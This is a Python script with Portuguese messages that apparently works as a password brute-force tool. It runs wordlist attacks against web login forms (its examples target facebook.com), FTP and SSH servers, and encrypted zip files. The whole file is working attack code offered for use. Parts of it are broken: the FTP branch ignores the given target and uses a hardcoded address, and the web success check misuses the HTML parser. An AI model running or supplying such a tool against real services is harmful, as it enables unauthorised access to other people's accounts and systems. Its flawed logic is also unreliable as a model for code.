
import requests
import argparse
import sys
import os

from ftplib import FTP
import paramiko

def abrirArquivo(path):
    if os.path.exists(path):
        arquivo = open(path, 'r')
        return arquivo
    else:
        print("Não foi encontrado nenhum arquivo em "+path)
        exit()

    
if len(sys.argv) < 2 :
    print("escolha a qual ferramenta voçê desejar usar")
    print("     Ex: python3 tools.py \"serviço a ser executando\" \"dominio ou ip\" wordlist")
    print("brute - bruteforce em páginas de login web. use as especificações abaixo no brute force web")
    print("     Ex: python3 tools.py brute \"https://facebook.com\" /usr/share/wordlist/rockyou.txt \"login failed\"")
    print("ftp - bruteforce em servidores ftp: o fuzz pode ser feito tanto no username quanto no password")
    print("     Ex: python3 tools.py ftp \"192.168.15.5\" 'username'/usr/share/wordlist/rockyou.txt")
    print("ssh - bruteforce no serviço de acesso ssh")
    print("     Ex: python3 tools.py ssh \"192.168.15.10\" /usr/share/wordlist/rockyou.txt")
    print("zip - bruteforce para extração de arquivo zip, no zip ou inves do endereço ip/DNS coloque o caminho do arquivo ")
    print("     Ex: python3 tools.py zip \"/home/user/extract.zip\" /usr/share/wordlist/rockyou.txt")
    exit()

if sys.argv[1] == 'brute':
    if len(sys.argv) < 6:
        print("Exemplo de uso do brute force web")
        print("Tanto o método GET ou POST, voçê tem que espicificar os paramêtros com valor FUZZ.")
        print("Ex: método GET")
        print("     python3 tools.py brute \"https://facebook.com/lgin=FUZZ&password=asd\" /usr/share/wordlist/rockyou.txt \"login failed\" GET")
        print("Ex: método POST")
        print("     python3 tools.py brute \"https://facebook.com/\" /usr/share/wordlist/rockyou.txt \"login failed\" POST \"login=FUZZ&password=asd\"")
        exit()
    
    url = sys.argv[2]
    wordlist = sys.argv[3]
    error_msg = sys.argv[4]
    method = sys.argv[5]

    arquivo = abrirArquivo(wordlist)
    from bs4 import BeautifulSoup

    if len(sys.argv) == 6 and method == 'GET':

        for palavra in arquivo.read().splitlines():
            response = requests.get(url.replace('FUZZ', palavra)).text
            soup = BeautifulSoup(response, "html.parser")
            result = soup.find_all(error_msg)
            if  result:
                if result != error_msg:
                  print("Password Encontrado: "+palavra)
                  exit()
    elif len(sys.argv) == 7 and method == 'POST':
        for palavra in arquivo.read().splitlines():
            response = requests.post(url, data=sys.argv[6].replace('FUZZ', palavra)).text
            soup = BeautifulSoup(response, "html.parser")
            result = soup.find_all(error_msg)
            if  result:
                if result != error_msg:
                  print("Password Encontrado: "+palavra)
                  exit()
            else:
                print("Password Errado: "+palavra)

    arquivo.close()

elif sys.argv[1] == 'ftp':

    if len(sys.argv) < 5 :
        print("Preencha todos  campos para executar a ferramenta.")
        print("Ex: python3 tools.py ftp 'endereço ip' 'username' wordlist")

    ip = sys.argv[2]
    username = sys.argv[3]
    wordlist = sys.argv[4]

    arquivo = abrirArquivo(wordlist)

    stop = 0

    for palavra in arquivo.read().splitlines():
        try:
            ftp = FTP("192.168.15.82")
            response = ftp.login(username,palavra)
            print("\n\nSenha encontrada.")
            print("Login: "+username)
            print("Password: "+palavra)
            print(response)
            stop = 1
        except:
            print("Password Errado:"+palavra)
        
        ftp.quit

        if stop == 1:
            exit()
        
    arquivo.close()

elif sys.argv[1] == 'ssh':

    if len(sys.argv) < 4:
        print("Preencha todos  campos para executar a ferramenta.")
        print("Ex: python3 tools.py ssh 'endereço ip' porta 'username' wordlist")
    
    ip = sys.argv[2]
    porta = sys.argv[3]
    username = sys.argv[4]
    wordlist = sys.argv[5]

    arquivo = abrirArquivo(wordlist)

    stop = 0

    for password in arquivo.read().splitlines():
        try:
            ssh_client =paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(hostname=ip,port=porta,username=username,password=password)

            print("\n\nAutenticando com sucesso")
            print("Login: "+username)
            print("Password: "+password)
            stop = 1
        except:
            print("Password Incorreto: "+password)

        if stop == 1:
            exit()

    arquivo.close()
elif sys.argv[1] == 'zip':
    from zipfile import ZipFile

    file = sys.argv[2]
    wordlist = sys.argv[3]

    zip = ZipFile(file, 'r')
    arquivo = abrirArquivo(wordlist)
    stop = 0

    for password in arquivo.read().splitlines():
        senha = bytes(password, 'utf-8')
        zip.setpassword(senha)
        try:   
            zip.testzip()
            print('\n\nSenha encontrada: '+ password+"\n\n")
            stop = 1
        except:
            print('Senha:'+password+' incorreta')
        
        if stop == 1:
            exit()
    
    arquivo.close()